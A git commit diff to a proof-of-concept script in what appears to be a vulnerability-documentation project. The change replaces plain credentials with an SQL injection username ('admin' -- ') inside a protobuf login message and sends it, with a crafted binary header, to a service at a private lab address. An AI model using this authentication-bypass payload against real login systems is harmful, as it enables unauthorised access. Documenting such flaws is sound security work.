b8fa2c98e066bef66f1565da0d1e82b9198b4e36
seongju.moon <prkitten@gmail.com>
2021-06-25 17:35:48 +0900

    [docs] update V07 login.py
    update V07 login.py

--- phase2/docs/03_vulnerabilities/V07/login.py
+++ phase2/docs/03_vulnerabilities/V07/login.py
@@ -5,23 +5,25 @@ import socket
 
 # login protobuf
 login = protocolLogin_pb2.LoginMsg()
-login.user_id = "admin"
-login.password = "lg"
+#login.user_id = "admin"
+#login.password = "lg"
+login.user_id = "admin' -- '"
+login.password = "00"
 
 msg = login.SerializeToString()
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('192.168.0.228', 50000))
 
-test = b'\x53\x42\x31\x54\x1b\x00\x00\x00\xc7\x8c\x07\x3c\xe8\x03\x00\x00'
+test = b'\x53\x42\x31\x54\x21\x00\x00\x00\xc7\x8c\x07\x3c\xe8\x03\x00\x00'
 s.sendall(test + msg)
+#print(test+msg)
 
 #result = test+msg
 #print(result)
 #print(type(result))
 
 #s.sendall(b'\x53\x42\x31\x54\x1b\x00\x00\x00\xc7\x8c\x07\x3c\xe8\x03\x00\x00\x0a\x05\x61\x64\x6d\x69\x6e\x12\x02\x6c\x67')
-
 
 #f = open("bbb", "wb")
 #f.write(login.SerializeToString())
